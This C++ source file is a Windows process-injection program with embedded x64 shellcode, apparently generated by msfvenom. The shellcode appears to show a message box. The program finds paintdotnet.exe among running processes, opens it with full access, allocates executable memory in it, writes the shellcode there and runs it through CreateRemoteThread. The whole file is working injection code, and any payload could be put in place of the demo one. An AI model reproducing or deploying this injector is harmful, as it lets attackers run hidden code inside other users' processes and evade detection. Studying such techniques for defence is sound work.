#include <Windows.h>
#include <tlHelp32.h>
#include <stdio.h>
#include <string>
#include <iostream>

int main(int argc, char ** argv) {

    setlocale(LC_ALL, "");

    unsigned char shellcode[] = 
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
"\x8d\x8d\x3d\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
"\x00\x3e\x4c\x8d\x85\x2f\x01\x00\x00\x48\x31\xc9\x41\xba"
"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
"\x56\xff\xd5\x62\x72\x6f\x75\x67\x68\x74\x20\x74\x6f\x20"
"\x79\x6f\x75\x20\x62\x79\x20\x6d\x73\x66\x63\x6f\x6e\x73"
"\x6f\x6c\x65\x20\x3e\x3a\x33\x00\x73\x68\x65\x6c\x6c\x63"
"\x6f\x64\x65\x20\x4f\x5f\x4f\x00\x75\x73\x65\x72\x33\x32"
"\x2e\x64\x6c\x6c\x00";

PROCESSENTRY32 pe32;

pe32.dwSize = sizeof(PROCESSENTRY32);

HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

Process32First(snapshot, &pe32);



wchar_t paintNetName[] = L"paintdotnet.exe";

size_t cSize = strlen(pe32.szExeFile)+1;
wchar_t* pe32Name = new wchar_t[cSize];
mbstowcs(pe32Name, pe32.szExeFile, cSize);
printf("starting\n\n");
wprintf(pe32Name);
printf("\n");
wprintf(paintNetName);
printf("\n");

do {
    if(wcscmp(pe32Name, paintNetName) == 0) {
        
        printf("\nSuccessfully found match!\n");
        wprintf(pe32Name);
        printf(" == ");
        wprintf(paintNetName);
        printf("\n");
        
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

        LPVOID allocated_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

        if (allocated_mem == NULL) {
            printf("Memory allocation failed: %ul\n", GetLastError());

            return 1;
        }

        printf("Memory page allocated at: 0x%p\n", allocated_mem);

        WriteProcessMemory(hProcess, allocated_mem, shellcode, sizeof(shellcode), NULL);

        HANDLE hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)allocated_mem, 0, 0, 0);

        if (hThread == NULL) {
            printf("Failed to obtain handle to process: %ul\n", GetLastError());

            return 1;
        }

        WaitForSingleObject(hThread, INFINITE);

        VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);

        CloseHandle(hThread);

        CloseHandle(hProcess);

        break;
    } else {
    printf(" - - - ");
    wprintf(paintNetName);
    printf(" - - - - Match failed.\n");
    wprintf(pe32Name);
    /*if (pe32Name[0] == "p") {
        wprintf(pe32Name);
        printf(" - - - - Match failed.\n");
    }*/
    cSize = strlen(pe32.szExeFile)+1;
    pe32Name = new wchar_t[cSize];
    mbstowcs(pe32Name, pe32.szExeFile, cSize);
}
 } while (
    Process32Next(snapshot, &pe32));
 return 0;

}
